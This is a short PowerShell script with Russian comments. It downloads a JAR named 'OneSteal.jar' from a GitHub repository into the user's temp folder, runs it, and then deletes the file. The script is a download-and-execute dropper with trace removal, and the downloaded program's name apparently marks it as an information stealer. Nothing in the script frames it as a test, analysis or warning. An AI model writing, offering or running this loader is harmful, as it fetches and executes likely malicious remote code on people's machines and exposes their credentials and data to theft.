# Укажите URL для скачивания программы
$downloadUrl = "https://github.com/N0llB1t3/InvokeSexDynamic/raw/main/OneSteal.jar"

# Укажите путь, куда будет сохранена программа
$outputFile = "$env:TEMP\OneSteal.jar"

# Скачиваем файл
Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile -UseBasicParsing

# Запускаем скачанную программу
Start-Process -FilePath $outputFile -Wait

# Удаляем скачанный файл (необязательно)
Remove-Item $outputFile
